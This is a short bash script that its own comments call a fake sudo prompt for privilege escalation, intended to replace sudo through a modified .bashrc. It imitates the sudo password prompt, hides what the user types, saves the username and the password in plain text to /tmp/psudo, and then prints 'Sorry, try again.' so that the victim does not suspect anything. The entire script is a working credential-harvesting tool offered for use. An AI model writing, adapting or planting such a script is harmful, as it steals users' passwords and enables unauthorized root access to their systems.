#!/bin/bash
#
# A quick fake sudo prompt for quick priv escalation.
# Works best when used with a modified .bashrc to point
# to our script instead of a real sudo binary.
#
# Could it use improving? Yes... yes it can.

TARGET='/tmp/psudo'

if [ ! -f $TARGET ]; then
  echo -n "Password:"
  stty -echo
  read password
  stty echo
  echo ""
  echo "$(whoami):$password" > $TARGET
  sleep 1
  echo "Sorry, try again." 1>&2
fi

#EXEC="sudo $*"
#$EXEC
